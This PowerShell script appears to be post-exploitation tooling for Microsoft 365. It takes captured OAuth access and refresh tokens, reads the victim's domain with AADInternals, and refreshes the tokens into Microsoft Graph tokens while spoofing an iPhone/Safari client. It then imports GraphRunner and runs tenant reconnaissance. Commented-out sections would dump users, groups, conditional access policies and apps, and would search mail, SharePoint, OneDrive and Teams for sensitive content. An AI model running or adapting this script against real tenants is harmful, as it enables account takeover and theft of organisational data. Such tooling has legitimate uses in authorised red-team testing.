[CmdletBinding()]
param(
    [Parameter(Mandatory=$false, ValueFromPipelineByPropertyName=$true)]
    [string]
    $AppName,

    [Parameter(Mandatory=$false, ValueFromPipelineByPropertyName=$true)]
    [string]
    $ReplyUrl,

    [Parameter(Mandatory=$false, ValueFromPipelineByPropertyName=$true)]
    [string]
    $domain,

    [Parameter(Mandatory=$false, ValueFromPipelineByPropertyName=$true)]
    [string[]]
    $Scope,

    [Parameter(Mandatory=$false, ValueFromPipelineByPropertyName=$true)]
    [PSCustomObject]
    $response
)

function New-TokensObject {
    param(
        [Parameter(Mandatory=$true)]
        [string]$AccessToken,
        
        [Parameter(Mandatory=$true)]
        [string]$RefreshToken
    )

    $tokens = New-Object PSObject -Property @{
        access_token = $AccessToken
        refresh_token = $RefreshToken
    }

    return $tokens
}


$access = $response.access_token
$refresh = $response.refresh_token

# Target details constructed from token   
$acc = Read-AADIntAccessToken $access
$user = $acc.upn
$domain = $user.Split("@")[1]

$tokz = Invoke-RefreshToMSGraphToken -domain $domain -refreshToken $refresh -Device iPhone -Browser Safari

# Assuming $response is an object with access_token and refresh_token
if ($tokz) {
    $tokens = New-TokensObject -AccessToken $tokz.access_token -RefreshToken $tokz.refresh_token
    # Output the tokens for verification (optional)
    Write-Host "Access Token from tokens object: $($tokens.access_token)"
    Write-Host "Refresh Token from tokens object: $($tokens.refresh_token)"
}

# Refresh-ToMSGraph
Write-Host "Refreshing to MSGRaph for GraphRunner modules"

########################################################################
# Import the GraphRunner module
Import-Module .\GraphRunner.ps1

# Use the constructed $tokens object with GraphRunner functions
# Assuming Invoke-ImportTokens is a hypothetical function for demonstration
# Replace with actual usage based on GraphRunner module requirements
# Example:

Invoke-ImportTokens -AccessToken $tokens.access_token -RefreshToken $tokens.refresh_token

# Invoke-GraphRunner -Tokens $tokens

# Invoke-SearchMailbox -Tokens $tokens
$headers = @{
    Authorization = "Bearer $accessToken"
}

$usersEndpoint = "https://graph.microsoft.com/v1.0/users"
$graphApiUrl = "https://graph.microsoft.com/v1.0"
$DetectorFile = ".\default_detectors.json"
$detectors = Get-Content $DetectorFile
$detector = $detectors |ConvertFrom-Json

$folderName = "GraphRunner-" + (Get-Date -Format 'yyyyMMddHHmmss')
New-Item -Path $folderName -ItemType Directory | Out-Null

Invoke-GraphRecon -Tokens $tokens -GraphRun | Out-File -Encoding ascii "$folderName\recon.txt"


# # GraphRecon
# if(!$DisableRecon){
#     Write-Host -ForegroundColor yellow "[*] Now running Invoke-GraphRecon."
#     Invoke-GraphRecon -Tokens $tokens -GraphRun | Out-File -Encoding ascii "$folderName\recon.txt"
# }

# # Users
# if(!$DisableUsers){
#     Write-Host -ForegroundColor yellow "[*] Now getting all users"
#     Get-AzureADUsers -Tokens $tokens -GraphRun -outfile "$folderName\users.txt"
# }

# # Groups
# if(!$DisableGroups){
#     Write-Host -ForegroundColor yellow "[*] Now getting all groups"
#     Get-SecurityGroups -Tokens $tokens -GraphRun | Out-File -Encoding ascii "$folderName\groups.txt"
# }

# # CAPS
# if(!$DisableCAPS){
#     Write-Host -ForegroundColor yellow "[*] Now getting conditional access policies"
#     Invoke-DumpCAPS -Tokens $tokens -ResolveGuids -GraphRun | Out-File -Encoding ascii "$folderName\caps.txt"
# }

# # Apps
# if(!$DisableApps){
#     Write-Host -ForegroundColor yellow "[*] Now getting applications"
#     Invoke-DumpApps -Tokens $tokens -GraphRun | Out-File -Encoding ascii "$foldername\apps.txt"
# }

# # Email
# if(!$DisableEmail){
#     $mailout = "$folderName\interesting-mail.csv"

#     Write-Host -ForegroundColor yellow "[*] Now searching Email using detector file $DetectorFile. Results will be written to $folderName."
#     foreach($detect in $detector.Detectors){
#         Invoke-SearchMailbox -Tokens $tokens -SearchTerm $detect.SearchQuery -DetectorName $detect.DetectorName -MessageCount 500 -OutFile $mailout -GraphRun -PageResults
#     }
# }

# # SharePoint and OneDrive Tests
# if(!$DisableSharePoint){
#     $spout = "$folderName\interesting-files.csv"

#     Write-Host -ForegroundColor yellow "[*] Now searching SharePoint and OneDrive using detector file $DetectorFile. Results will be written to $folderName."
#     foreach($detect in $detector.Detectors){
#         Invoke-SearchSharePointAndOneDrive  -Tokens $tokens -SearchTerm $detect.SearchQuery -DetectorName $detect.DetectorName -PageResults -ResultCount 500 -ReportOnly -OutFile $spout -GraphRun
#     }
# }

# # Teams
# if(!$DisableTeams){
#     $teamsout = "$folderName\interesting-teamsmessages.csv"
#     Write-Host -ForegroundColor yellow "[*] Now searching Teams using detector file $DetectorFile. Results will be written to $folderName."
#     foreach($detect in $detector.Detectors){
#         Invoke-SearchTeams  -Tokens $tokens -SearchTerm $detect.SearchQuery -DetectorName $detect.DetectorName -ResultSize 500 -OutFile $teamsout -GraphRun
#     }
# }
